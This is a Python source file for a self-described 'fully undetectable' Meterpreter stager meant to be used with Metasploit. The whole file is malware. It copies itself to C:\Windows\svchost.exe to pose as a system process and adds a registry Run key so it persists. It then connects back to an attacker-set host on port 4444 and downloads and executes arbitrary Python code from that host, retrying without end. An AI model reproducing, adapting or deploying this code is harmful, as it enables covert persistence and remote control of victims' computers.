#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  Fully Undetectable Payload Meterpreter (FUD)
#  Custom Payload for Metasploit Framework
#  Copyright 2016 lfasmpao <mrth3n3rd@gmail.com>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#
#  All rights reserved. 
#

## IMPORTS ##
import socket,subprocess,struct,os,sys,time

## This must be changed
HOST = '' # HOST IP
PORT = 4444 # PORT IP

def main():
    # Check file if existing
    from shutil import copyfile
    checkfile = os.path.isfile("C:\\Windows\svchost.exe")
    if checkfile == True:
        exist()
    else:
    # Copy file to C:
        copyfile(os.path.basename(sys.argv[0]), "C:\\Windows\svchost.exe")
    # Run registry add to start up
        subprocess.call("reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v svchost /t REG_SZ /d C:\\Windows\svchost.exe /f", shell=True)
    # Connect to Server
        connect()


def connect():
    # Main sequence for receiving socks packets
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        shell=struct.unpack('>I',s.recv(4))[0]
        data=s.recv(shell)
        while len(data)<shell:
            data+=s.recv(shell-len(data))
            exec(data,{'s':s})
    except socket.error as e:
	time.sleep(1)
	connect()


def exist():
    #if file is existing
    connect()
    pass

if __name__ == '__main__':
    while True:
      main()

